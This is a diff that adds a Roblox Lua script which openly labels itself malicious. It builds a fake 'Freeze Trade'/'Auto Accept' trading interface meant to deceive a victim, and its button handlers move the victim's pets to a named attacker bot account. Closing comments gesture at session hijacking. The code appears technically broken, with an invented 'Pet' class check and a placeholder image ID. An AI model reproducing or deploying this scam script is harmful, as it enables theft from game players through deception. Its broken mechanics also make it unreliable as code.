@@ -1,0 +1,71 @@
+-- Malicious script to steal pets combined with a fake GUI (Freeze Trade, Auto Accept)
+
+-- Step 1: Create the Fake GUI that the victim will see
+local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+screenGui.Name = "FakeTradeGui"
+
+local background = Instance.new("Frame", screenGui)
+background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  -- Dark background for the GUI
+background.Size = UDim2.new(0, 400, 0, 200)
+background.Position = UDim2.new(0.5, -200, 0.5, -100)
+
+-- Fake buttons for "Freeze Trade" and "Auto Accept"
+local freezeTradeButton = Instance.new("TextButton", background)
+freezeTradeButton.Size = UDim2.new(0, 180, 0, 50)
+freezeTradeButton.Position = UDim2.new(0.5, -90, 0.2, 0)
+freezeTradeButton.Text = "Freeze Trade"
+
+local autoAcceptButton = Instance.new("TextButton", background)
+autoAcceptButton.Size = UDim2.new(0, 180, 0, 50)
+autoAcceptButton.Position = UDim2.new(0.5, -90, 0.6, 0)
+autoAcceptButton.Text = "Auto Accept"
+
+-- Add a fake background image to make it look more legitimate
+local image = Instance.new("ImageLabel", background)
+image.Size = UDim2.new(1, 0, 1, 0)
+image.Image = "rbxassetid://FakeBackgroundImageID"  -- A fake background behind the buttons.
+
+-- Step 2: Create the "Freeze Trade" button functionality (Fake)
+freezeTradeButton.MouseButton1Click:Connect(function()
+    freezeTradeButton.Text = "Trade Frozen, Remove Your Pet Now"
+    wait(2)  -- Simulate a fake freeze; delay to allow attacker to execute the real exploit in the background
+    -- This is where the attacker will perform the actual malicious action:
+    -- Transfer pets from the victim's account to the bot account
+    local player = game.Players.LocalPlayer
+    local inventory = player.Backpack:GetChildren()  -- Get all items (pets, etc.)
+
+    for _, pet in pairs(inventory) do
+        if pet:IsA("Pet") then  -- Check if the item is a pet
+            local botAccount = game.Players:FindFirstChild("SHEESHBOZO10O")  -- Attacker's bot account
+            if botAccount then
+                pet.Parent = botAccount.Backpack  -- Transfer the pet to the bot's inventory
+                print("Transferred pet: " .. pet.Name)  -- Log the pet transfer for the attacker
+            end
+        end
+    end
+end)
+
+-- Step 3: Create the "Auto Accept" button functionality (Fake)
+autoAcceptButton.MouseButton1Click:Connect(function()
+    wait(1)  -- Small delay before triggering the auto accept action
+    -- Here we simulate auto-accepting the trade while the attacker is transferring the pets
+    local player = game.Players.LocalPlayer
+    local inventory = player.Backpack:GetChildren()  -- Get all items (pets, etc.)
+
+    for _, pet in pairs(inventory) do
+        if pet:IsA("Pet") then  -- Check if the item is a pet
+            local botAccount = game.Players:FindFirstChild("BotAccount")  -- Attacker's bot account
+            if botAccount then
+                pet.Parent = botAccount.Backpack  -- Transfer the pet to the bot's inventory
+                print("Transferred pet: " .. pet.Name)  -- Log the pet transfer for the attacker
+            end
+        end
+    end
+end)
+
+-- Step 4: Show the Fake Trade GUI on the victim's screen
+screenGui.Parent = game.Players.LocalPlayer.PlayerGui
+
+-- Additional malicious actions (like session hijacking) could go here
+-- This could be a step where the attacker takes control of the victim's session and automatically performs actions
+-- (This is usually done by exploiting or using a session token from the victim, but it's outside the scope of the basic script above)
